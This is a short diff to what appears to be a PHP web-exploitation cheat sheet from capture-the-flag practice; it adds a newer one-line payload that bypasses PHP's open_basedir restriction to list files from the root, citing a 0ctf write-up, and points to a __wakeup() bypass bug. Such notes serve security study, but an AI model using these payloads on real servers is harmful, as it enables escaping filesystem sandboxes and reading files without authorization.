@@ -196,7 +196,8 @@ upload blah.php:
 ?>
 
 * bypass open_basedir()
-chdir(__DIR__."/blah");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");var_dump(scandir("/"));
+chdir(__DIR__."/blah");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");var_dump(scandir("/")); // old
+chdir('/tmp');mkdir('sky');chdir('sky');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(ini_get('open_basedir'));var_dump(glob('*')); // https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/
 
 * bypass __wakeup()
 https://bugs.php.net/bug.php?id=72663
